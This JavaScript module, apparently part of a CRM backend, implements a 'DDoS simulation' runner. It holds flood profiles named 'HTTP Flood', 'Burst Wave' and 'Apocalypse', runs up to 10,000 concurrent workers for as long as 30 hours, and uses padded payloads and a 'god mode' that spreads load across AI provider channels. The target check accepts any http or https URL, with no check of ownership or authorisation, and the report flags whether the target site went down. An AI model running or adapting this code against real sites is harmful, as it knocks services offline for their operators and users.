import DdosTest from '../models/DdosTest.js';
import {
  getAiLoadChannels,
  ALL_HTTP_METHODS as LOAD_METHODS,
} from './loadTestRunner.js';
import { getAppSettings } from '../models/AppSettings.js';

export const MAX_DURATION_SECONDS = 30 * 3600;
export const MAX_CONCURRENCY = 10000;
export const GOD_MODE_MAX_CONCURRENCY = 10000;
export const GOD_MODE_BURST_SIZE = 500;
export const POWER_PAYLOAD_BYTES = 16384;
export const MAX_IN_FLIGHT_CAP = 200000;
export const ALL_HTTP_METHODS = LOAD_METHODS;

export const ATTACK_PROFILES = {
  http_flood: {
    label: 'HTTP Flood',
    description: 'Ultra god master — rapid GET/HEAD flood at ×200 burst per worker',
    methods: ['GET', 'HEAD'],
    burstSize: 200,
    flood: true,
    timeoutMs: 5000,
    wave: false,
    heavyPayload: false,
    powerTimeoutMs: 2000,
  },
  post_flood: {
    label: 'POST Flood',
    description: 'Ultra god master — POST/PUT/PATCH payload spam at ×160 burst per worker',
    methods: ['POST', 'PUT', 'PATCH'],
    burstSize: 160,
    flood: true,
    timeoutMs: 8000,
    wave: false,
    heavyPayload: true,
    powerTimeoutMs: 2500,
  },
  mixed_vector: {
    label: 'Mixed Vector',
    description: 'Ultra god master — all HTTP methods at ×100 burst per worker',
    methods: [...ALL_HTTP_METHODS],
    burstSize: 100,
    flood: true,
    timeoutMs: 6000,
    wave: false,
    heavyPayload: true,
    powerTimeoutMs: 2000,
  },
  burst_wave: {
    label: 'Burst Wave',
    description: 'Ultra god master — pulsing botnet spikes at ×250 burst per worker',
    methods: ['GET', 'POST', 'HEAD'],
    burstSize: 250,
    flood: true,
    timeoutMs: 5000,
    wave: true,
    waveAttackMs: 10000,
    wavePauseMs: 3000,
    heavyPayload: false,
    powerTimeoutMs: 1500,
  },
  aggressive: {
    label: 'Aggressive',
    description: 'Ultra god master — all methods, ×300 burst, 4KB payloads, no mercy',
    methods: [...ALL_HTTP_METHODS],
    burstSize: 300,
    flood: true,
    timeoutMs: 4000,
    wave: false,
    heavyPayload: true,
    powerTimeoutMs: 1500,
  },
  apocalypse: {
    label: 'Apocalypse',
    description: 'Ultra god master annihilation — all methods, ×400 burst, 4KB payloads',
    methods: [...ALL_HTTP_METHODS],
    burstSize: 400,
    flood: true,
    timeoutMs: 3000,
    wave: false,
    heavyPayload: true,
    powerTimeoutMs: 1000,
  },
};

const runningTests = new Map();

function percentile(sorted, p) {
  if (!sorted.length) return 0;
  const idx = Math.ceil((p / 100) * sorted.length) - 1;
  return sorted[Math.max(0, Math.min(idx, sorted.length - 1))];
}

function timelineBucketSize(durationSeconds) {
  if (durationSeconds <= 600) return 1;
  if (durationSeconds <= 3600) return 10;
  if (durationSeconds <= 86400) return 60;
  return 300;
}

function resilienceGrade(score) {
  if (score >= 90) return 'A';
  if (score >= 80) return 'B';
  if (score >= 70) return 'C';
  if (score >= 60) return 'D';
  return 'F';
}

function computeResilience(report) {
  let score = 100;
  const errorRate = report.errorRate || 0;
  const peakErrorRate = report.peakErrorRate || 0;
  const successRate = report.successRate || 0;

  if (errorRate >= 80) score -= 50;
  else if (errorRate >= 50) score -= 35;
  else if (errorRate >= 25) score -= 20;
  else if (errorRate >= 10) score -= 10;

  if (peakErrorRate >= 90) score -= 25;
  else if (peakErrorRate >= 70) score -= 15;
  else if (peakErrorRate >= 50) score -= 8;

  if (report.peakRequestsPerSecond > 500 && errorRate > 30) score -= 10;
  if (report.avgLatencyMs > 5000) score -= 10;
  else if (report.avgLatencyMs > 2000) score -= 5;

  score = Math.max(0, Math.min(100, Math.round(score)));

  return {
    resilienceScore: score,
    resilienceGrade: resilienceGrade(score),
    siteDown: errorRate >= 80 || (report.totalRequests > 50 && successRate < 5),
    siteDegraded: errorRate >= 40 || peakErrorRate >= 60 || report.avgLatencyMs > 3000,
  };
}

function createAggregator(durationSeconds) {
  const bucketSize = timelineBucketSize(durationSeconds);
  return {
    bucketSize,
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    latencySum: 0,
    minLatencyMs: Infinity,
    maxLatencyMs: 0,
    bytesTransferred: 0,
    statusCodes: {},
    methodCounts: {},
    errorTypes: {},
    channelCounts: {},
    timelineMap: new Map(),
    latencySample: [],
  };
}

function recordResult(agg, result, elapsedMs) {
  agg.totalRequests += 1;
  if (result.ok) agg.successfulRequests += 1;
  else agg.failedRequests += 1;

  agg.latencySum += result.latencyMs;
  agg.minLatencyMs = Math.min(agg.minLatencyMs, result.latencyMs);
  agg.maxLatencyMs = Math.max(agg.maxLatencyMs, result.latencyMs);
  agg.bytesTransferred += result.bytes || 0;

  if (result.method) {
    agg.methodCounts[result.method] = (agg.methodCounts[result.method] || 0) + 1;
  }
  if (result.channel) {
    agg.channelCounts[result.channel] = (agg.channelCounts[result.channel] || 0) + 1;
  }

  const codeKey = result.status ? String(result.status) : 'ERR';
  agg.statusCodes[codeKey] = (agg.statusCodes[codeKey] || 0) + 1;
  if (result.error) {
    agg.errorTypes[result.error] = (agg.errorTypes[result.error] || 0) + 1;
  }

  const sec = Math.floor(elapsedMs / 1000);
  const bucketStart = Math.floor(sec / agg.bucketSize) * agg.bucketSize;
  if (!agg.timelineMap.has(bucketStart)) {
    agg.timelineMap.set(bucketStart, {
      second: bucketStart,
      requests: 0,
      errors: 0,
      latencySum: 0,
    });
  }
  const bucket = agg.timelineMap.get(bucketStart);
  bucket.requests += 1;
  bucket.latencySum += result.latencyMs;
  if (!result.ok) bucket.errors += 1;

  if (agg.latencySample.length < 5000) {
    agg.latencySample.push(result.latencyMs);
  }
}

function finalizeReport(agg, durationSeconds, profile, meta = {}) {
  const total = agg.totalRequests;
  const latencies = [...agg.latencySample].sort((a, b) => a - b);
  const timeline = Array.from(agg.timelineMap.values())
    .sort((a, b) => a.second - b.second)
    .map((b) => ({
      second: b.second,
      requests: b.requests,
      errors: b.errors,
      avgLatencyMs: b.requests ? Math.round(b.latencySum / b.requests) : 0,
    }));

  const bucketSec = agg.bucketSize;
  let peakRps = 0;
  let peakErrorRate = 0;
  timeline.forEach((b) => {
    const rps = bucketSec ? b.requests / bucketSec : b.requests;
    peakRps = Math.max(peakRps, rps);
    if (b.requests) {
      peakErrorRate = Math.max(peakErrorRate, (b.errors / b.requests) * 100);
    }
  });

  const successRate = total ? Math.round((agg.successfulRequests / total) * 1000) / 10 : 0;
  const errorRate = total ? Math.round((agg.failedRequests / total) * 1000) / 10 : 0;

  const base = {
    totalRequests: total,
    successfulRequests: agg.successfulRequests,
    failedRequests: agg.failedRequests,
    successRate,
    errorRate,
    avgLatencyMs: total ? Math.round(agg.latencySum / total) : 0,
    minLatencyMs: total && agg.minLatencyMs !== Infinity ? Math.round(agg.minLatencyMs) : 0,
    maxLatencyMs: Math.round(agg.maxLatencyMs),
    p95LatencyMs: Math.round(percentile(latencies, 95)),
    requestsPerSecond: durationSeconds ? Math.round((total / durationSeconds) * 10) / 10 : 0,
    peakRequestsPerSecond: Math.round(peakRps * 10) / 10,
    peakErrorRate: Math.round(peakErrorRate * 10) / 10,
    bytesTransferred: agg.bytesTransferred,
    statusCodes: agg.statusCodes,
    methodCounts: agg.methodCounts,
    errorTypes: agg.errorTypes,
    channelCounts: agg.channelCounts,
    timeline,
    timelineBucketSeconds: bucketSec,
    burstSize: meta.burstSize || profile.burstSize,
    maxPower: Boolean(meta.maxPower),
    pipelineDepth: meta.pipelineDepth || 1,
    peakInFlight: meta.peakInFlight || 0,
    theoreticalPeakRps: meta.theoreticalPeakRps || 0,
    godMode: Boolean(meta.godMode),
    aiProviderChannels: meta.aiProviderChannels || 0,
    aiProvidersUsed: meta.aiProvidersUsed || [],
    effectiveConcurrency: meta.effectiveConcurrency || 0,
    mixedMethods: Boolean(meta.mixedMethods),
    methods: meta.methods || profile.methods,
  };

  return { ...base, ...computeResilience(base) };
}

export async function resolveDdosGodModePlan(settings) {
  const channels = getAiLoadChannels(settings);
  const perChannel = Math.ceil(GOD_MODE_MAX_CONCURRENCY / channels.length);
  const concurrency = Math.min(GOD_MODE_MAX_CONCURRENCY, perChannel * channels.length);
  return {
    godMode: true,
    concurrency,
    mixedMethods: true,
    methods: [...ALL_HTTP_METHODS],
    aiProviderChannels: channels.length,
    aiProvidersUsed: channels.map((c) => c.id),
    effectiveConcurrency: concurrency,
    burstSize: GOD_MODE_BURST_SIZE,
    channels,
    profile: {
      ...ATTACK_PROFILES.apocalypse,
      burstSize: GOD_MODE_BURST_SIZE,
      methods: [...ALL_HTTP_METHODS],
      flood: true,
      heavyPayload: true,
      timeoutMs: 3000,
      wave: false,
    },
  };
}

export function validateDdosUrl(raw) {
  let url;
  try {
    url = new URL(String(raw || '').trim());
  } catch {
    throw new Error('Enter a valid URL (include http:// or https://)');
  }
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Only http and https URLs are allowed');
  }
  return url.toString();
}

export function clampDdosConfig(body = {}, godPlan = null) {
  const durationSeconds = Math.min(
    MAX_DURATION_SECONDS,
    Math.max(5, Number(body.durationSeconds) || 30)
  );

  const godMode = Boolean(body.godMode || godPlan?.godMode);
  const maxPower = Boolean(body.maxPower || godMode);
  let concurrency;
  let attackProfile;
  let mixedMethods = false;
  let methods = [];
  let aiProviderChannels = 0;
  let aiProvidersUsed = [];
  let burstSize;

  if (godMode && godPlan) {
    concurrency = godPlan.concurrency;
    attackProfile = 'apocalypse';
    mixedMethods = true;
    methods = [...ALL_HTTP_METHODS];
    aiProviderChannels = godPlan.aiProviderChannels;
    aiProvidersUsed = godPlan.aiProvidersUsed;
    burstSize = godPlan.burstSize;
  } else {
    concurrency = Math.min(
      MAX_CONCURRENCY,
      Math.max(1, Number(body.concurrency) || 100)
    );
    attackProfile = ATTACK_PROFILES[body.attackProfile] ? body.attackProfile : 'http_flood';
    const profile = ATTACK_PROFILES[attackProfile];
    mixedMethods = profile.methods.length > 1;
    methods = [...profile.methods];
    burstSize = profile.burstSize;
  }

  return {
    durationSeconds,
    concurrency,
    attackProfile,
    godMode,
    maxPower,
    mixedMethods,
    methods,
    aiProviderChannels,
    aiProvidersUsed,
    burstSize,
  };
}

function resolvePipelineDepth(test, burstSize) {
  if (test.godMode) return 10;
  if (test.maxPower) return 6;
  return 2;
}

function resolveMaxInFlight(concurrency, burstSize, pipelineDepth) {
  return Math.min(concurrency * burstSize * pipelineDepth, MAX_IN_FLIGHT_CAP);
}

function buildHeavyPayload(bytes = POWER_PAYLOAD_BYTES) {
  const pad = 'x'.repeat(Math.max(512, bytes - 64));
  return JSON.stringify({ flood: true, ts: Date.now(), data: pad });
}

async function fireAttackRequest(url, method, options = {}) {
  const {
    timeoutMs = 5000,
    flood = true,
    channel = 'default',
    heavyPayload = false,
    payloadBytes = POWER_PAYLOAD_BYTES,
  } = options;
  const started = performance.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const upper = String(method || 'GET').toUpperCase();
  const hasBody = ['POST', 'PUT', 'PATCH'].includes(upper);
  try {
    const response = await fetch(url, {
      method: upper,
      redirect: 'follow',
      signal: controller.signal,
      headers: {
        'User-Agent': `VistawinCRM-DDoSBot/${channel}`,
        'X-DDoS-Simulation': '1',
        'X-Attack-Channel': channel,
        ...(hasBody ? { 'Content-Type': 'application/json' } : {}),
      },
      ...(hasBody ? { body: heavyPayload ? buildHeavyPayload(payloadBytes) : JSON.stringify({ flood: true, ts: Date.now() }) } : {}),
    });
    const latencyMs = performance.now() - started;
    let bytes = 0;
    if (upper !== 'HEAD') {
      if (flood && response.body?.cancel) {
        try {
          await response.body.cancel();
        } catch {
          // ignore
        }
      } else {
        try {
          const buf = await response.arrayBuffer();
          bytes = buf.byteLength;
        } catch {
          bytes = 0;
        }
      }
    }
    return {
      ok: response.ok,
      status: response.status,
      latencyMs,
      bytes,
      method: upper,
      channel,
      error: null,
    };
  } catch (error) {
    const latencyMs = performance.now() - started;
    const message = error.name === 'AbortError' ? 'Timeout' : (error.message || 'Network error');
    return {
      ok: false,
      status: 0,
      latencyMs,
      bytes: 0,
      method: upper,
      channel,
      error: message,
    };
  } finally {
    clearTimeout(timer);
  }
}

function isWaveActive(elapsedMs, profile) {
  if (!profile.wave) return true;
  const cycle = (profile.waveAttackMs || 10000) + (profile.wavePauseMs || 3000);
  const pos = elapsedMs % cycle;
  return pos < (profile.waveAttackMs || 10000);
}

export async function executeDdosTest(testId) {
  const test = await DdosTest.findById(testId);
  if (!test || test.status !== 'pending') return;

  test.status = 'running';
  test.startedAt = new Date();
  test.errorMessage = '';
  await test.save();

  const abort = { cancelled: false };
  runningTests.set(String(testId), abort);

  const settings = await getAppSettings();
  const channels = test.godMode
    ? getAiLoadChannels(settings)
    : [{ id: 'default', label: 'default' }];

  const profile = test.godMode
    ? {
      ...ATTACK_PROFILES.apocalypse,
      burstSize: GOD_MODE_BURST_SIZE,
      methods: [...ALL_HTTP_METHODS],
      flood: true,
      heavyPayload: true,
      timeoutMs: 3000,
      wave: false,
    }
    : (ATTACK_PROFILES[test.attackProfile] || ATTACK_PROFILES.http_flood);

  const burstSize = test.godMode ? GOD_MODE_BURST_SIZE : profile.burstSize;
  const methods = (test.methods?.length ? test.methods : profile.methods)
    .filter((m) => ALL_HTTP_METHODS.includes(String(m).toUpperCase()));
  const activeMethods = methods.length ? methods : ['GET'];
  const maxPower = Boolean(test.maxPower || test.godMode);
  const pipelineDepth = resolvePipelineDepth(test, burstSize);
  const maxInFlight = resolveMaxInFlight(test.concurrency, burstSize, pipelineDepth);
  const timeoutMs = maxPower ? (profile.powerTimeoutMs || 1500) : profile.timeoutMs;
  const payloadBytes = maxPower ? POWER_PAYLOAD_BYTES : 4096;
  const useHeavy = maxPower || profile.heavyPayload;

  const agg = createAggregator(test.durationSeconds);
  const startMs = Date.now();
  const endMs = startMs + test.durationSeconds * 1000;
  const flight = { count: 0, peak: 0 };

  const reportMeta = {
    godMode: test.godMode,
    maxPower,
    pipelineDepth,
    aiProviderChannels: test.godMode ? (test.aiProviderChannels || channels.length) : 0,
    aiProvidersUsed: test.aiProvidersUsed?.length ? test.aiProvidersUsed : channels.map((c) => c.id),
    effectiveConcurrency: test.concurrency,
    burstSize,
    mixedMethods: test.mixedMethods || activeMethods.length > 1,
    methods: activeMethods,
    theoreticalPeakRps: Math.round((maxInFlight / Math.max(0.001, timeoutMs / 1000)) * 10) / 10,
  };

  function pickMethod() {
    return (test.mixedMethods || activeMethods.length > 1)
      ? activeMethods[Math.floor(Math.random() * activeMethods.length)]
      : activeMethods[0];
  }

  function launchRequest(channel) {
    flight.count += 1;
    flight.peak = Math.max(flight.peak, flight.count);
    const method = pickMethod();
    const elapsed = Date.now() - startMs;
    fireAttackRequest(test.targetUrl, method, {
      flood: profile.flood,
      timeoutMs,
      channel,
      heavyPayload: useHeavy,
      payloadBytes,
    })
      .then((result) => recordResult(agg, result, elapsed))
      .catch(() => recordResult(agg, {
        ok: false,
        status: 0,
        latencyMs: timeoutMs,
        bytes: 0,
        method,
        channel,
        error: 'Launch error',
      }, elapsed))
      .finally(() => {
        flight.count -= 1;
      });
  }

  async function worker(workerIndex) {
    const channel = channels[workerIndex % channels.length]?.id || 'default';
    while (Date.now() < endMs && !abort.cancelled) {
      const elapsed = Date.now() - startMs;
      if (!isWaveActive(elapsed, profile)) {
        await new Promise((r) => setTimeout(r, 50));
        continue;
      }

      if (maxPower) {
        for (let i = 0; i < burstSize && flight.count < maxInFlight; i += 1) {
          if (!isWaveActive(Date.now() - startMs, profile)) break;
          launchRequest(channel);
        }
        await new Promise((r) => setImmediate(r));
      } else {
        const batch = [];
        for (let i = 0; i < burstSize; i += 1) {
          batch.push(fireAttackRequest(test.targetUrl, pickMethod(), {
            flood: profile.flood,
            timeoutMs,
            channel,
            heavyPayload: useHeavy,
            payloadBytes,
          }));
        }
        const results = await Promise.all(batch);
        results.forEach((result) => recordResult(agg, result, elapsed));
      }
    }
  }

  try {
    const workers = Array.from({ length: test.concurrency }, (_, i) => worker(i));
    await Promise.all(workers);

    const drainDeadline = Date.now() + Math.max(15000, timeoutMs * 2);
    while (flight.count > 0 && Date.now() < drainDeadline && !abort.cancelled) {
      await new Promise((r) => setTimeout(r, 100));
    }

    reportMeta.peakInFlight = flight.peak;

    const elapsedSec = Math.max(1, Math.ceil((Date.now() - startMs) / 1000));
    if (abort.cancelled) {
      test.status = 'cancelled';
      if (agg.totalRequests > 0) {
        test.report = finalizeReport(agg, elapsedSec, profile, reportMeta);
      }
    } else {
      test.status = 'completed';
      test.report = finalizeReport(agg, test.durationSeconds, profile, reportMeta);
    }
  } catch (error) {
    test.status = 'failed';
    test.errorMessage = error.message || 'DDoS simulation failed';
  } finally {
    test.finishedAt = new Date();
    await test.save();
    runningTests.delete(String(testId));
  }
}

export function cancelDdosTest(testId) {
  const abort = runningTests.get(String(testId));
  if (abort) abort.cancelled = true;
}

export function getAttackProfilesMeta() {
  return Object.entries(ATTACK_PROFILES).map(([id, p]) => ({
    id,
    label: p.label,
    description: p.description,
    methods: p.methods,
    burstSize: p.burstSize,
    wave: Boolean(p.wave),
    heavyPayload: Boolean(p.heavyPayload),
  }));
}
